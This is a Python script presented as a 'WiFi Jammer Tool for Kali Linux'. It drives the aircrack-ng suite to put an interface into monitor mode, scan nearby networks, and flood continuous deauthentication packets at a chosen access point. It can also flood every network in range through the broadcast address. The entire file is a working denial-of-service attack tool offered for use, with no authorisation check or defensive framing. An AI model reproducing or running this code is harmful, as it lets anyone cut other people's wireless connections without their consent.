#!/usr/bin/env python3
# WiFi Jammer Tool for Kali Linux
# This script requires root privileges and aircrack-ng suite to be installed

import os
import sys
import time
import subprocess
import signal
import argparse
from datetime import datetime

# Check if the script is run as root
if os.geteuid() != 0:
    print("[-] This script must be run as root")
    sys.exit(1)

# Check if aircrack-ng is installed
try:
    subprocess.check_output(["which", "airmon-ng"])
except subprocess.CalledProcessError:
    print("[-] Aircrack-ng is not installed. Please install it using: apt-get install aircrack-ng")
    sys.exit(1)

class WiFiJammer:
    def __init__(self):
        self.interface = None
        self.monitor_interface = None
        self.target_bssid = None
        self.target_channel = None
        self.processes = []
        
    def parse_arguments(self):
        """Parse command line arguments"""
        parser = argparse.ArgumentParser(description="WiFi Jammer - A tool for sending deauthentication packets")
        parser.add_argument("-i", "--interface", required=True, help="Wireless interface to use")
        parser.add_argument("-c", "--channel", type=int, help="Channel of the target AP")
        parser.add_argument("-b", "--bssid", help="BSSID of the target AP")
        parser.add_argument("-s", "--scan", action="store_true", help="Scan for available networks")
        parser.add_argument("-a", "--all", action="store_true", help="Deauthenticate all networks (use with caution)")
        
        return parser.parse_args()
    
    def cleanup(self, signum=None, frame=None):
        """Clean up and reset the interface"""
        print("\n[*] Cleaning up and resetting interface...")
        
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait()
            except:
                pass
        
        if self.monitor_interface:
            os.system(f"airmon-ng stop {self.monitor_interface} > /dev/null 2>&1")
            os.system(f"ifconfig {self.interface} up > /dev/null 2>&1")
            os.system("service NetworkManager restart > /dev/null 2>&1")
        
        print("[+] Done. Exiting...")
        sys.exit(0)
    
    def enable_monitor_mode(self):
        """Enable monitor mode on the wireless interface"""
        print(f"[*] Enabling monitor mode on {self.interface}")
        os.system("service NetworkManager stop > /dev/null 2>&1")
        os.system(f"ifconfig {self.interface} down > /dev/null 2>&1")
        os.system(f"airmon-ng check kill > /dev/null 2>&1")
        os.system(f"airmon-ng start {self.interface} > /dev/null 2>&1")
        
        self.monitor_interface = f"{self.interface}mon"
        if not os.path.exists(f"/sys/class/net/{self.monitor_interface}"):
            self.monitor_interface = self.interface
            
        print(f"[+] Monitor mode enabled on {self.monitor_interface}")
    
    def scan_networks(self):
        """Scan for available wireless networks"""
        print("[*] Scanning for networks... Press Ctrl+C to stop")
        
        # Start airodump-ng to scan networks
        try:
            subprocess.run(["airodump-ng", self.monitor_interface])
        except KeyboardInterrupt:
            print("\n[+] Scan completed")
    
    def deauth_network(self):
        """Send deauthentication packets to the target network"""
        if self.target_channel:
            print(f"[*] Setting channel to {self.target_channel}")
            os.system(f"iwconfig {self.monitor_interface} channel {self.target_channel} > /dev/null 2>&1")
        
        if self.target_bssid:
            print(f"[*] Starting deauthentication attack on BSSID: {self.target_bssid}")
            deauth_proc = subprocess.Popen(
                ["aireplay-ng", "--deauth", "0", "-a", self.target_bssid, self.monitor_interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(deauth_proc)
        else:
            print("[*] Starting deauthentication attack on all networks (broadcast)")
            deauth_proc = subprocess.Popen(
                ["aireplay-ng", "--deauth", "0", "-a", "FF:FF:FF:FF:FF:FF", self.monitor_interface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            self.processes.append(deauth_proc)
        
        try:
            print("[+] Deauthentication attack running... Press Ctrl+C to stop")
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
    
    def run(self):
        """Main method to run the tool"""
        print("=" * 60)
        print(" WiFi Jammer Tool for Kali Linux")
        print("=" * 60)
        
        # Register signal handlers for clean exit
        signal.signal(signal.SIGINT, self.cleanup)
        signal.signal(signal.SIGTERM, self.cleanup)
        
        # Parse arguments
        args = self.parse_arguments()
        self.interface = args.interface
        self.target_bssid = args.bssid
        self.target_channel = args.channel
        
        # Enable monitor mode
        self.enable_monitor_mode()
        
        if args.scan:
            self.scan_networks()
            self.cleanup()
        elif args.all or self.target_bssid:
            self.deauth_network()
            self.cleanup()
        else:
            print("[-] You must specify either --scan, --all, or provide a target with --bssid")
            self.cleanup()

if __name__ == "__main__":
    jammer = WiFiJammer()
    jammer.run() 